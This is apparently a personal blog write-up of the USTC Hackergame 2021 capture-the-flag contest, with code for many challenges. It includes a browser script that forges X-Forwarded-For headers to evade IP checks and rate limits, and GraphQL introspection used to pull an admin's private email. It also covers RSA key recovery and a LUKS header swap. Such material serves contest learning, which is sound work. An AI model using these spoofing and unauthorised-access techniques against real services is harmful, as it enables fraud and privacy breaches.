---
title: "USTC Hackergame 2021 Writeup"
image: /assets/img/cover/ustc-hackergame-2021-writeup.png
date: "2021-10-30 16:54:02 +0800"
---

> 题图是本次 USTC Hackergame 我的题目完成情况

一年一度的 USTC Hackergame 又开始了。其实去年我就有参加，而且似乎在排行榜上留下了自己的名字，但是由于种种原因没有写 Writeup。于是这次，我打算每做一题就写一题的 Writeup，避免比赛结束之后没有动力写。

以下按照解题时间顺序排序，有多个小题的，各小题分开排列。为了简单，题目本身的描述我就不写在 Writeup 里了，大家可以去 [官方 Writeup](https://github.com/USTC-Hackergame/hackergame2021-writeups){: target="_blank" rel="noopener"} 查看。

## 签到

和往年一样，表单的参数写在 URL search param 里了，所以我直接按照要求填入当前时间的 Unix 时间戳就行。（当然比赛结束之后就要手动填以前的时间了）

```js
location.href=`http://202.38.93.111:10000/?page=${Math.floor(Date.now()/1000)}`
```

## 进制十六——参上

签到题二号，只需要把十六进制编辑器左侧未打码的十六进制数抄下来并还原成 ASCII 字符即可。

```js
hex.split(" ").map(s=>String.fromCodePoint(parseInt(s,16))).join("")
```

## 去吧！追寻自由的电波

签到题三号，只需要拖进 Audacity 使用改变速率效果放慢三倍，就能清晰听出音频内容。为了不让我们听混，还特意使用了 [NATO phonetic alphabet](https://en.wikipedia.org/wiki/NATO_phonetic_alphabet){: target="_blank" rel="noopener"}。对着表格听认即可。

## 猫咪问答 Pro Max

惯例的搜索引擎使用技巧考试。

- 对于第一题，虽然“信息安全俱乐部的域名（[sec.ustc.edu.cn](https://sec.ustc.edu.cn){: target="_blank" rel="noopener"}）已经无法访问”，但是难道我不会用 WebArchive 吗？答案在 [WebArchive 保存下来的这一页](https://web.archive.org/web/20181004003308/http://sec.ustc.edu.cn/doku.php/codes){: target="_blank" rel="noopener"} 可以找到。
- 对于第二题，反正是不大于 5 的整数，可以枚举嘛。不过答案其实在 [LUG 的介绍页面](https://lug.ustc.edu.cn/wiki/intro/){: target="_blank" rel="noopener"} 找到，虽然它没有及时更新，导致我最后还是枚举了。
- 对于第三题，答案在 [LUG 的西区图书馆新活动室启用新闻页面](https://lug.ustc.edu.cn/news/2016/06/new-activity-room-in-west-library/){: target="_blank" rel="noopener"} 的图片里可以看到。
- 对于第四题，虽然当然也可以枚举，但是可以看 [SIGBOVIK 2021 会报](http://sigbovik.org/2021/proceedings.pdf){: target="_blank" rel="noopener"} 的第 213 页，直接读一读这篇文章，看看图表就能找到答案。
- 对于第五题，这指的是 [愚人节的 RFC8962](https://datatracker.ietf.org/doc/html/rfc8962){: target="_blank" rel="noopener"}，可以在 Reporting Offenses 一节找到。

## 透明的文件

打开文件可以看到明显是 [ANSI 转义序列](https://zh.wikipedia.org/zh-hans/ANSI%E8%BD%AC%E4%B9%89%E5%BA%8F%E5%88%97){: target="_blank" rel="noopener"}，只不过被打印出来进行了再转义，只需要写个脚本把它变回去。一开始只是把 `"["` 替换成 `"\x1B["`，但是输出时发现字符没有出现，反而是有些地方的字符消失了。仔细一看只是在特定位置输出了空格而已，所以把空格替换成一个普通字符即可。

```js
const data=fs.readFileSync("./transparent.txt",{"encoding":"utf-8"})
const result=data.replaceAll("[","\x1B[").replaceAll(" ","8")
console.log(result)
```

## Amnesia - 轻度失忆

我们只需要把所有所需的信息全部放在 .text 里面就好了。为此我们只需要在栈上存字符串，手动一个字节一个字节填进去，再打印就好。

```c
#include <stdio.h>

int main() {
	char str[15]={0};
	str[0]='H';
	str[1]='e';
	str[2]='l';
	str[3]='l';
	str[4]='o';
	str[5]=',';
	str[6]=' ';
	str[7]='w';
	str[8]='o';
	str[9]='r';
	str[10]='l';
	str[11]='d';
	str[12]='!';
	str[13]='\n';
	str[14]='\0';
	printf(str);
	return 0;
}
```

## 旅行照片

社会工程学题。

搜索 KFC 蓝色，可以得知，这是特殊的蒂夫尼蓝色KFC，很幸运地在第一页就找到了 [秦皇岛的蒂夫尼蓝色 KFC](https://www.xiaohongshu.com/discovery/item/5e985cda00000000010076e5){: target="_blank" rel="noopener"}。也就是 [这一家](https://j.map.baidu.com/3b/lfic){: target="_blank" rel="noopener"}。对照地图，可以从视角和地图的对应关系得知拍照方向，从阴影位置得知拍照时间，同时根据透视关系，可以从右侧的楼的窗户的方向得知所在楼层的高度（这一部分参考 [这个知乎答案](https://www.zhihu.com/question/24651925/answer/28527771){: target="_blank" rel="noopener"}）。在地图链接里可以找到电话信息。不过地图上的 KFC 标偏了，实际上正确的位置应当在 [这个地方](https://j.map.baidu.com/16/1Aic){: target="_blank" rel="noopener"}，可以在街景视图上看到建筑上的字。

不过实际解题时楼的高度估计出现了误差一些，所以这一问我是枚举的。

## 卖瓜

首先进行一番实验。

初始状态放 `2222222222222222222222222222222222222222222222` 个 9 斤的瓜可以直接放上 `-9223372036854775808 = -2**63` 斤瓜，说明有地方发生了溢出，但是，如果再放一次 `2222222222222222222222222222222222222222222222` 个 9 斤称上就有 `-1.844674407371E+19` 斤瓜了，说明溢出并没有发生在乘完之后加的阶段。那么，可能是在乘法阶段出的问题。

重置一次，尝试放上 `2**63//9=1024819115206086200` 个 9 斤的瓜，发现一共放上了 `9223372036854775800` 斤瓜了，再放上 `1024819115206086201` 个 9 斤的瓜，发现一共放上了 `-8` 斤瓜！那么再重复一遍这个过程，便一共放上了 `-16` 斤瓜，再放上 `4` 个 9 斤的瓜就刚好凑齐 20 斤了。

这么看来，应该是解析数字和乘法时使用的是 `int64`，而最后求和时使用的是 `Bigint` 吧。

## 图之上的信息

任何一个标准的 GraphQL 服务器都是允许你获取它的 schema 的，这在 [GraphQL 官方文档的这一页](https://graphql.org/learn/introspection/){: target="_blank" rel="noopener"} 有描述。

首先，通过如下的 GraphQL 查询可以获取所有种类的查询的名称和类型：

```graphql
{ __schema { queryType { fields { name type { name kind } } } } }
```

从查询结果看，有一种名为 `user` 的查询看上去可以获取用户信息，它的类型是 `GUser`。再用以下查询获取这种查询的格式：

```graphql
{ __type(name: \"GUser\") { name fields { name type { name kind } } } }
```

根据返回的格式，可以直接构造查询获取管理员的用户信息。由于我们的用户 id 为 2，那么管理员大概 id 为 1。于是构造出来的查询如下：

```graphql
{ user(id: 1) { id username privateEmail } }
```

返回值里面的 `privateEmail` 就是答案。

不过这里我只是随便猜了一下查询参数的格式。其实这一部分也可以通过 `queryType` 里的 `fields` 里的  `args` 获取。

## Amnesia - 记忆清除

既然我们的 .text 段被清空了，那我们不能使用任何函数了。但是其实只定义一个 main 数组，这样我们就可以把代码放在 `.rodata` 段，从这里执行我们的程序（这依赖于 GCC 会在这两段内容很少的情况下把 .text 和 .rodata 放在同一页从而使得 .rodata 也可执行的行为）。以前有人做过这种事情，[还写了文章](http://jroweboy.github.io/c/asm/2015/01/26/when-is-main-not-a-function.html){: target="_blank" rel="noopener"}。不过原文是 x86_64 架构下的，我们是 x86_32 架构，所以不能照抄，但是可以直接照着文章重新生成一遍。为了保证一致，我们把题面中出现的 Docker 镜像拉下来，在这个镜像的容器里进行试验。

首先我们要能直接从汇编调用 Linux 系统调用。对照 [这张 x86_32 的 Linux 系统调用表](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit){: target="_blank" rel="noopener"} 即可轻松编出以下的汇编：

```c
void main(){
	__asm__(
		"movl $4, %eax;" // 调用 write 系统调用
		"movl $1, %ebx;" // 1 号文件描述符是标准输出
		"movl $message, %ecx;" // 指向 Hello world 的指针
		"movl $14, %edx;" // 消息长度
		"int $0x80;" // 执行！
		"movl $1, %eax;" // 调用 exit 系统调用，避免执行到 Hello World那里去
		"movl $0, %ebx;"
		"int $0x80;"
		"message: .ascii \"Hello, world!\\n\";"
	);
}
```

其次，我们需要让我们的汇编与加载位置无关，为此我们需要获取当前指令寄存器的值，并以此计算 message 的位置。这里参考了 [这个 stackoverflow 问答](https://stackoverflow.com/questions/599968/reading-program-counter-directly){: target="_blank" rel="noopener"} 的方法

```c
void main(){
	__asm__(
		"movl $4, %eax;"
		"movl $1, %ebx;"
		"call next;" // 通过 call 指令把当前地址放在栈上
		// 这里汇编器保证使用相对跳转所以是位置无关的
		"next:popl %ecx;"// 从栈上读取刚刚保存的地址
		"addl $23, %ecx;"// 加上偏移即可得到 message 地址
		"movl $14, %edx;"
		"int $0x80;"
		"movl $1, %eax;"
		"movl $0, %ebx;"
		"int $0x80;"
		"message: .ascii \"Hello, world!\\n\";"
	);
}
```

按照那篇参考文献，接下来我们只需要把这段代码变成数组存到 `.rodata` 段就可以了。

但是这是不工作的。

于是我使用 gdb 进行了一下调查，发现和我想的并不一样，由于 `_start` 也在 `.text`，也被清掉了，所以它并不会调用 `main`。同时，这个编译环境下 `.rodata` 和 `.text` 不会被放进同一页了， `.rodata` 内的内容也无法执行。但是同时我发现 `_start` 虽然清空了，但是执行它并不会产生段错误，要一直执行到 `.fini` 段的 `_fini` 才会报错退出，同时 `.fini` 段并没有被清空。于是我考虑把 `main` 塞到 `.fini` 的 `_fini` 之前。

我可以利用 `__attribute__((section(...)))` 来指定的所在的段。一开始我选择把 `main` 塞到 `.fini` 段，但是这样会导致 `main` 在 `_fini` 之后，最后我还是把 `main` 放在了 `.fini._fini` 段，这样它就神奇地跑到 `_fini` 之前了。

另外还有一个问题，就是全零的字节会和 `main` 开头的字节拼成其他指令（也就是有指令对齐问题），所以需要稍微调整一下指令的内容。最后我的代码如下：

```c
__attribute__((section(".fini._fini")))
void main(){
	__asm__(
		"movl $4, %eax;"
		"movl $1, %ebx;"
		// 这之前的指令用于调整和前面零字节拼成的新指令
		"movl $4, %eax;"
		"movl $1, %ebx;"
		"call next;"
		"next:popl %ecx;"
		"addl $23, %ecx;"
		"movl $14, %edx;"
		"int $0x80;"
		"movl $1, %eax;"
		"movl $0, %ebx;"
		"int $0x80;"
		"message: .ascii \"Hello, world!\\n\";"
	);
}
```

最后拿到的 Flag 提到了 `.bss` 段，本来以为这说明我这个是非预期解，但是实际上看了官方的 Writeup 之后才发现这只是出题人的灵感来源而已。

## FLAG 助力大红包

活动说明中写明会对 IP 地址进行前后端校验，点进助力页面点一下按钮，可以在浏览器的网络请求记录里看到所谓前端其实就是在浏览器端调用搜狗的 API 获取 IP 地址传给后端，这个可以轻松篡改。而对于后端校验，由于没有后端源码所以我们看不出来是什么情况。不过从请求响应可以看到，它套了一层 nginx，搜索 nginx 获取真实 IP，可以看到 [这个 stackoverflow 问答](https://stackoverflow.com/questions/61671996/nginx-how-to-get-the-actual-client-ip){: target="_blank" rel="noopener"} 提到了 `X-Forwarded-For` 这个标头，对其进行伪造，居然就通过了。于是我们分别对 256 个 `/8` 网段都伪造一次即可，注意两次请求之间需要空一点时间以绕开频率限制，代码如下（需要直接在浏览器控制台中执行）：

```js
for (i = 0; i < 256; i++) {
	// 这部分是从 Chrome 的网络请求记录里面复制出来略作修改的
	let result = await fetch(location.href, {
		"headers": {
			"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			"accept-language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-HK;q=0.6,zh-TW;q=0.5,ja-JP;q=0.4,ja;q=0.3,ar-XB;q=0.2,ar;q=0.1",
			"cache-control": "no-cache",
			"content-type": "application/x-www-form-urlencoded",
			"pragma": "no-cache",
			"upgrade-insecure-requests": "1", "X-Forwarded-For": `${i}.0.0.0`
		},
		"referrer": "http://202.38.93.111:10888/invite/eb2f9a2e-f9ca-4406-9a7c-fc408c79615f",
		"referrerPolicy": "strict-origin-when-cross-origin",
		"body": `ip=${i}.0.0.0`,
		"method": "POST",
		"mode": "cors",
		"credentials": "include"
	});
	let body = await result.text();
	if (!(body.includes("助力成功") || body.includes("重复的 /8 地址"))) {
		i--
	}
	await new Promise((res) => setTimeout(res, 1500))
}
```

## 赛博厨房 - Level 0

似乎只会出现 `0,1` `1,0` `0,0` `1,1` 四种菜谱，分别准备好程序即可。程序的内容当然是普通的移动，拿物品，放物品，没有什么特别的。以下给出 `0,1` 的示例：

```
向右 1 步
拿起 1 个物品
向下 1 步
向左 1 步
放下 1 个物品
向上 1 步
向右 2 步
拿起 1 个物品
向下 1 步
向左 2 步
放下 1 个物品
向上 1 步
```

## 赛博厨房 - Level 1

似乎只会出现 73 个 0 这一种菜谱，所以只需要写这一种情况。

这里我们便需要使用循环了，我的代码如下：

```
向右 1 步
拿起 73 个物品
向左 1 步
向下 1 步
放下 1 个物品
如果手上的物品大于等于 1 向上跳转 1 行
```

## Easy RSA

题目中的脚本和其中的注释中给出了足够多的信息，可以让我们直接获取 `p` 和 `q`。

首先来求 `p`。要求 `p`，首先要对已知的 `x` 和 `y`求出 `y! mod x`。如注释所说，直接计算肯定不行。但是注意到 x 与 y 的 差值很小，而我们知道 `(x-1)! mod x` 在 `x` 为质数时为 `-1`（也就是威尔逊定理），在 `x` 为 `4` 时 为 `2`，在其他情况下为 `0`，所以首先检查一下 `x` 是否为质数。经过检查，`x` 确实是质数，那么由于 `(x-1)! = y! * (y+1) * ... * (x-1)`，所以我们只需先求出 `t = (x-1) * ... * (x-(x-y-1)) mod x = (x-y-1)! * (-1)**(x-y-1) mod x`，那么就可以得到 `y! mod x = -1 * t**(-1) mod x` 了。由于 `x-y` 很小，这是可行的。

其次来求 `q`。首先，`value` 应当为 10 个连续的质数，所以由最后一个质数 `value[-1]` 的值可以得到所有 10 个质数的值。而由于 `value_q = qq**e mod n` ，而我们知道 `e` 和 `n` 的质因数分解，所以我们可以轻松算出 `qq`，而 `q` 则是 `sympy.nextprime(qq)`。这里可以检查一下 `qq` 是否是质数，如果不是这说明代码写错了。

有了 `p` 和 `q` 当然就能破解 RSA 了。完整的代码如下：

```python
import math
import sympy

e = 65537

x = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451
y = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439

def get_t():
	return ((-1 ** (x-y-1))*math.factorial(x-y-1)) % x
t = get_t()

def get_y_fac_mod_x():
	return (-1 * (sympy.mod_inverse(t,x))) % x
y_fac_mod_x = get_y_fac_mod_x()

p = sympy.nextprime(y_fac_mod_x)

def get_value():
	v = [80096058210213458444437404275177554701604739094679033012396452382975889905967]
	for i in range(1, 10):
		v.insert(0,sympy.prevprime(v[0]))
	return v

value = get_value()

value_q = 5591130088089053683141520294620171646179623062803708281023766040254675625012293743465254007970358536660934858789388093688621793201658889399155357407224541324547522479617669812322262372851929223461622559971534394847970366311206823328200747893961649255426063204482192349202005330622561575868946656570678176047822163692259375233925446556338917358118222905050574458037965803154233167594946713038301249145097770337253930655681648299249481985768272321820718607757023350742647019762122572886601905212830744868048802864679734428398229280780215896045509020793530842541217790352661324630048261329493088812057300480085895399922301827190211956061083460036781018660201163819104150988531352228650991733072010425499238731811243310625701946882701082178190402011133439065106720309788819

def get_q():
	n = 1
	phi_n = 1
	for i in range(10):
		n = n * value[i]
		phi_n = phi_n * (value[i]-1)
	qq_d = sympy.mod_inverse(e,phi_n)
	qq = pow(value_q, qq_d, n)
	return sympy.nextprime(qq)

q = get_q()

d = sympy.mod_inverse(e,(p-1)*(q-1))
c = 110644875422336073350488613774418819991169603750711465190260581119043921549811353108399064284589038384540018965816137286856268590507418636799746759551009749004176545414118128330198437101472882906564195341277423007542422286760940374859966152871273887950174522820162832774361714668826122465471705166574184367478
m = pow(c, d, p * q)

open("flag.txt", "wb").write(int.to_bytes(m, math.ceil(math.log(m,256)), "big"))
```

## 马赛克

这个打码过程几乎是可逆的。一个马赛克像素对应的二维码像素也就几个，稍微枚举一下就可以得到能打出这种码的像素组合。同时我们还可以利用二维码结构的信息，先行填上去几个点。如此便可还原很大一部分二维码像素的内容。至于剩下无法确认的部分，单纯依靠二维码本身的纠错特性就能还原内容了。还原代码如下（写得挺乱的）：

```python
from PIL import Image
import math

BOX_Y,BOX_X = 103,137
BOX_SIZE = 23
BOX_N = 20
QR_N = 57
QR_SIZE = 11

with Image.open("./pixelated_qrcode.bmp") as im:
	mosaic=[[im.getpixel((BOX_X+x*BOX_SIZE,BOX_Y+y*BOX_SIZE)) for x in range(BOX_N)] for y in range(BOX_N)]
	qrcode=[[-1 for _ in range(QR_N)] for _ in range(QR_N)]
	# 读取未打码部分
	for x in range(627):
		for y in range(627):
			if not ((BOX_X <= x < BOX_X+BOX_SIZE*BOX_N) and (BOX_Y <= y < BOX_Y+BOX_SIZE*BOX_N)):
				qrcode[y//QR_SIZE][x//QR_SIZE]=im.getpixel((x,y))
	# 二维码格式要求的部分
	for sx,sy in [(28,28),(28,50),(50,28),(50,50)]:
		for i in range(-2,3):
			for j in range(-2,3):
				if (i==2) or (i==-2) or (j==2) or (j==-2):
					qrcode[sy+j][sx+i]=0
	# 对每一个马赛克像素找出所有可能的原始二维码像素组合
	selection=[]
	for xi in range(BOX_N):
		for yj in range(BOX_N):
			# 找出对这个马赛克像素有贡献的原始二维码像素
			content={}
			for i in range(BOX_SIZE):
				for j in range(BOX_SIZE):
					x=BOX_X+BOX_SIZE*xi+i
					y=BOX_Y+BOX_SIZE*yj+j
					qrx=x//QR_SIZE
					qry=y//QR_SIZE
					if not ((qrx,qry) in content):
						content[(qrx,qry)]=0
					content[(qrx,qry)]+=1
			source = [*content.keys()]
			known = [qrcode[y][x] for x,y in source]
			guess = [[value] if value>=0 else [0,255] for value in known]
			guessId = [0 for _ in guess]
			possibles = []
			# 枚举所有可能性，找出所有可能正确的可能性
			while True:
				sum = 0
				for i in range(len(guessId)):
					sum += content[source[i]]*guess[i][guessId[i]]
				mean = math.floor(sum/(BOX_SIZE**2))
				if(mosaic[yj][xi]==mean):
					possible =[(source[i],guess[i][guessId[i]]) for i in range(len(guessId))]
					print(possible)
					possibles.append(possible)
				has_next = False
				for i in range(len(guessId)):
					if guessId[i]+1<len(guess[i]):
						has_next = True
						guessId[i]+=1
						for j in range(i):
							guessId[j]=0
						break
				if not has_next:
					break
			selection.append(possibles)
	# 找出可以完全确定原始内容的马赛克像素，并以此排除一些其他马赛克像素的某些可能性
	# 重复执行，直到无法进一步确认
	while True:
		confirmed=[*filter(lambda x:len(x)==1,selection)]
		unconfirmed=[*filter(lambda x:len(x)!=1,selection)]
		if len(confirmed)==0:
			break
		new_cells={}
		for possibles in confirmed:
			possible=possibles[0]
			for p,v in possible:
				x,y=p
				if qrcode[y][x]<0:
					new_cells[p]=v
				qrcode[y][x]=v
		print(new_cells)
		selection=[*map(lambda ps:[*filter(lambda p:all(map(lambda ptv:(qrcode[ptv[0][1]][ptv[0][0]] < 0) or (qrcode[ptv[0][1]][ptv[0][0]] == ptv[1]),p)),ps)],unconfirmed)]
	# 在图片上填上所有能确定内容的的像素
	for x in range(627):
		for y in range(627):
			if ((BOX_X <= x < BOX_X+BOX_SIZE*BOX_N) and (BOX_Y <= y < BOX_Y+BOX_SIZE*BOX_N)):
				v=qrcode[y//QR_SIZE][x//QR_SIZE]
				if v>=0:
					im.putpixel((x,y),v)
	im.save('unmosaic.bmp')
```

实际运行时，一共四百个马赛克像素中，有大约二百五十个可以完全还原。做到这个程度，确实能扫出来了。二维码实际内容还在 Flag 前后加了垃圾数据，可能是为了让二维码变得大一些。

## 加密的 U 盘

读过 [去年官方 writeup](https://github.com/USTC-Hackergame/hackergame2020-writeups/blob/master/official/%E5%AE%A4%E5%8F%8B%E7%9A%84%E5%8A%A0%E5%AF%86%E7%A1%AC%E7%9B%98/README.md){: target="_blank" rel="noopener"} 的都知道，LUKS 的密码和 master-key-file 是两回事。如果单纯换密码不换 master-key-file ，那依旧可以用 master-key-file 重置密码。我这里直接用 `cryptsetup` 的 `luksHeaderBackup` 和 `luksHeaderRestore`，把 day1 的元信息粘到 day2 上，就可以直接用旧密码读取内容了。具体过程如下：

```log
$ # 首先把分区提取出来
$ fdisk -l day1.img
# 此处省略输出
$ fdisk -l day2.img
# 此处省略输出
$ dd if=day1.img of=day1-inner.img bs=512 count=38879 skip=2048
$ dd if=day2.img of=day2-inner.img bs=512 count=38879 skip=2048
$ # 验证一下第一天的密码
$ sudo cryptsetup luksOpen day1-inner.img day1
Enter passphrase for day1-inner.img:
$ sudo mkdir /mnt/day1
$ sudo mount /dev/mapper/day1 /mnt/day1
$ # 开始复制粘贴 Header
$ sudo cryptsetup luksHeaderBackup day1-inner.img --header-backup-file header.bin
$ sudo cryptsetup luksHeaderRestore day2-inner.img --header-backup-file header.bin
$ # 使用旧密码装载
$ sudo cryptsetup luksOpen day2-inner.img day2
Enter passphrase for day2-inner.img:
$ sudo mkdir /mnt/day2
$ sudo mount /dev/mapper/day2 /mnt/day2
$ # 此时便可在 /mnt/day1 和 /mnt/day2 读取两天的磁盘各自的内容
```

注意，对于像我这样的 WSL 老用户，需要提前更新到 WSL2，并且安装最新的 WSL2 内核，不然会因为内核没有 `dm-crypt` 模块而无法打开 LUKS 镜像。

顺带一提，第一天的镜像里真的有随机过程的资料。

## minecRaft

打开控制台，立即被断到了不知道哪来的 `debugger` 语句里。看一下源码，发现有一个 `setInterval` 会每秒钟构造一个函数触发断点。同时可以看到，大部分 JavaScript 文件都被混淆了，所以首先我们应当搞明白这些代码在干什么。Chrome 的开发者工具的 Source 一栏内有一个 Overrides 一项（[相关介绍](https://developer.chrome.com/blog/new-in-devtools-65/#overrides){: target="_blank" rel="noopener"}），可以让我们直接修改内容并刷新重新运行，这使得我们可以用这个功能方便地进行反混淆。首先，我们可以直接把触发 `debugger` 的代码删掉，其次我们可以对代码逐步进行等价替换并重新运行。

在页面引用的几个混淆过的 JS 文件当中，`jsm/miscs/flag.js` 最为可疑。我们考虑将其还原成可读的代码。整理之后可以发现，有一个函数从一个数组被用来获取字符串，而在模块加载时有一段代码会调整字符串数组的顺序，于是便修改代码输出处理过的字符串数组，再把所有获取字符串的地方替换成实际获取到的字符串。进行一番还原之后，可以发现 `gyflagh` 函数判断了一个输入在进行 `encrypt` 操作之后是否为特定值。而 `encrypt` 相关代码还原后如下：

```js
String.prototype.encrypt = function (key) {
    const ctx = new Array(0x2), keys = new Array(0x4);
    let str = '', plaintext = escape(this);
    for (var i = 0x0; i < 0x4; i++)
        keys[i] = Str4ToLong(key.slice(i * 0x4, (i + 0x1) * 0x4));
    for (i = 0x0; i < plaintext.length; i += 0x8) {
        ctx[0x0] = Str4ToLong(plaintext.slice(i, i + 0x4));
        ctx[0x1] = Str4ToLong(plaintext.slice(i + 0x4, i + 0x8));
        code(ctx, keys);
        str += LongToBase16(ctx[0x0]) + LongToBase16(ctx[0x1]);
    }
    return str;
};
function code(ctx, keys) {
    let ctx0 = ctx[0x0], ctx1 = ctx[0x1];
    const t=0x52cfb2de + 0x4b67c6db
    for (let i = 0; i < 0x20; i++) {
        const i1 = i + 1;
        const n=i*t
        const n1=i1*t
        ctx0 += (ctx1 << 0x4 ^ ctx1 >>> 0x5) + ctx1 ^ n + keys[n & 0x3]
        ctx1 += (ctx0 << 0x4 ^ ctx0 >>> 0x5) + ctx0 ^ n1 + keys[n1 >>> 0xb & 0x3];
    }
    ctx[0x0] = ctx0;
    ctx[0x1] = ctx1;
}
```

可以看到这是一个普通的对称加密算法，我们只需要把它反过来就可以得到解密算法：

```js
String.prototype.decrypt = function (key) {
    const ctx = new Array(0x2), keys = new Array(0x4);
    let str = '', plaintext = this;
    for (var i = 0x0; i < 0x4; i++)
        keys[i] = Str4ToLong(key.slice(i * 0x4, (i + 0x1) * 0x4));
    for (i = 0x0; i < plaintext.length; i += 0x10) {
        ctx[0x0] = Base16ToLong(plaintext.slice(i, i + 0x8));
        ctx[0x1] = Base16ToLong(plaintext.slice(i + 0x8, i + 0x10));
        uncode(ctx, keys);
        str += LongToStr4(ctx[0x0]) + LongToStr4(ctx[0x1]);
    }
    return unescape(str);
};
function uncode(ctx, keys) {
    let ctx0 = ctx[0x0], ctx1 = ctx[0x1];
    const t=0x52cfb2de + 0x4b67c6db
    for (let i = 0x1f; i >= 0; i--) {
        const i1 = i + 1;
        const n=i*t
        const n1=i1*t
        ctx1 -= (ctx0 << 0x4 ^ ctx0 >>> 0x5) + ctx0 ^ n1 + keys[n1 >>> 0xb & 0x3];
        ctx0 -= (ctx1 << 0x4 ^ ctx1 >>> 0x5) + ctx1 ^ n + keys[n & 0x3]
    }
    ctx[0x0] = ctx0;
    ctx[0x1] = ctx1;
}
```

对 `gyflagh` 函数内的字符串和 key 进行 `decrypt` 操作，便可以得到能让 `gyflagh` 函数返回 `true` 的输入。这个输入当然就是 Flag 的括号内的部分了。

## Micro World

打开 x64dbg，挂到正在运行的程序上，发现窗口类名是 pygame，说明这个程序是从用 python 写的玩意儿打包出来的，很有可能是用的 pyinstaller。于是搜索一下发现使用 [PyInstaller Extractor](https://github.com/extremecoders-re/pyinstxtractor){: target="_blank" rel="noopener"} 可以拆开 pyinstaller 打的包，不过注意需要你的 Python 版本和打包时的 Python 版本一致才能正常拆包出来，本题中是用 Python 3.8 打的包。用 [decompyle3](https://github.com/rocky/python-decompile3){: target="_blank" rel="noopener"} 可以反编译拆出来的 pyc 文件，虽然最外层的控制流的处理上略有一些错误，但是稍作修改便能正常运行。于是我们把各个粒子的速度反转过来，并让它在一定时间后停止模拟，就可以看到粒子拼成了 Flag 文本的形状。

另外我还试了 [uncompyle6](https://github.com/rocky/python-uncompyle6){: target="_blank" rel="noopener"} 和 [pycdc](https://github.com/zrax/pycdc){: target="_blank" rel="noopener"}，不过它们的反编译质量不够高以至于我不能很快地看出来到底哪里反编译错了。

## p😭q

有频谱信息，大概可以还原出音频来吧。题目给了生成图片的代码，我们只需要倒过来就好。首先我们使用 `imageio` 库把 gif 文件读成 `numpy.narray` 序列，然后从每一帧中根据红色条高度得到每一个频率的分贝数，然后把它转换一下塞进 `librosa.feature.inverse.mel_to_audio` 得到音频数据，最后把使用 `soundfile` 库它输出为音频文件即可。需要注意的是，我们的 gif 是索引格式的，所以拿到的色值不是 RGB 值而是索引值。代码如下：

```python
import imageio
import librosa
import numpy
import soundfile

num_freqs = 32
min_db = -60
max_db = 30
height = 46
quantize = 2
white_pixel = 255
fft_window_size = 2048
frame_step_size = 512
window_function_type = 'hann'

im = imageio.get_reader('flag.gif')

spectrogram = numpy.array([[max_db-quantize*min([height,*filter(lambda i:frame[i*quantize,(freq+1)*quantize*quantize-1]!=white_pixel,range(height))]) for freq in range(num_freqs)] for frame in im]).transpose()
print(spectrogram.shape)

sample_rate = 22050
y = librosa.feature.inverse.mel_to_audio(librosa.feature.inverse.db_to_power(spectrogram),sample_rate,n_fft=fft_window_size, hop_length=frame_step_size, window=window_function_type)
soundfile.write("flag.ogg", y, sample_rate, format="ogg")
```

最后还原出的音频虽然电流声很大，但是至少可以听出来说了什么。把听到的内容抄出来就好了。


## JUST BE FUN

看起来是要用类似于三维版 [Befunge](https://esolangs.org/wiki/Befunge){: target="_blank" rel="noopener"} 的玩意儿写一个简单计算器。不过需要注意除了所有的控制流操作都变成了三维的以外，这个解释器不支持 `p` 和 `g` 指令，但 `\` 指令的语义改为交换栈内指定两个位置的值，这样虽然不能再修改代码本身了，但是依旧保证了图灵完全。

为了方便编程和调试，我们直接在给出的判定代码的基础上进行修改。除了按需改变输入输出，我们还编写了一些辅助查看和生成代码的方法：

```python
def put(x,y,z,code):
    for j,line in enumerate(code):
        for i,char in enumerate(line):
            game_board[x+i][y+j][z] = char

def dump(x,y,z,w,h):
    for j in range(h):
        print("".join([game_board[x+i][y+j][z] for i in range(w)]))
```

这样我们就可以在各层用类似二维版 Befunge 的格式编写程序了。我们在每一层分别放置一个组件，然后用第三个维度的跳转把它们连接起来。

首先是第 0 层，它会读入第一个操作符，并开始一个读入操作符并进行操作的循环。之后每个操作执行完成之后，便会移动回第 0 层右上的 `v` 处，开始下一次循环。注意读入的数值是 ASCII 码，所以我们需要额外转换。同时，由于我们只能使用 0 到 9 这十个立即数，我们需要做额外运算才能得到比较大的立即数。

```python
put(0,0,0,[
    ">~68*-v",
    "[    ~<"
])
```

在第 1 层和第 2 层我们分别实现了加法和乘法。这两个运算在解释器内有直接支持，所以较为简单。可以看到这两层分别复制了一份操作符，然后消耗复制的操作符来判断是否等于一个特定值。这样原来的操作符可以留给下一个操作来判断。而如果是对应的操作，则直接删除操作符，然后进行运算。之后每一种操作符都是如此实现的

```python
put(0,0,1,[
    "      ]           <",
    ">:167*+-!!v        ",
    "[         _$~68*-+^"
])
put(0,0,2,[
    "      ]         <",
    "[       _$~68*-*^",
    ">:67*-!!^"
])
```

在第 3 层和第 4 层我们分别实现了乘方和左移。由于输入的操作数一定在 1 和 9 之间，我们直接对操作数进行打表。我们依次判断操作数是 1 至 9 的哪一个，然后进入对应的分支进行操作。而常数次乘方和常数左移都可以用固定次数的乘法和压栈来实现。

```python
put(0,0,3,[
    "      ]                <",
    ">:99*9+4+-!!v           ",
    "[           _$~68*-v    ",
    "v                  <    ",
])
for i in range(1,10):
    put(0,i*3+1,3,[
    "     >$"+":"*(i-1)+"*"*(i-1)+" "*(18-2*i)+"^",
    ">:"+str(i)+"-!|                  ",
    "v    <                  ",
    ])
put(0,0,4,[
    "      ]                  <",
    "[         _$~68*-v        ",
    ">:69*6+-!!^               ",
    "v                <        ",
])
for i in range(1,10):
    put(0,i*3+1,4,[
    "     >$"+"2"*(i)+"*"*(i)+" "*(18-2*i)+"^",
    ">:"+str(i)+"-!|                    ",
    "v    <                    ",
    ])
```

如果想对程序结构有更直观的理解，以下是第 3 层生成出来的代码结构：

```plaintext
      ]                <
>:99*9+4+-!!v
[           _$~68*-v
v                  <
     >$                ^
>:1-!|
v    <
     >$:*              ^
>:2-!|
v    <
     >$::**            ^
>:3-!|
v    <
     >$:::***          ^
>:4-!|
v    <
     >$::::****        ^
>:5-!|
v    <
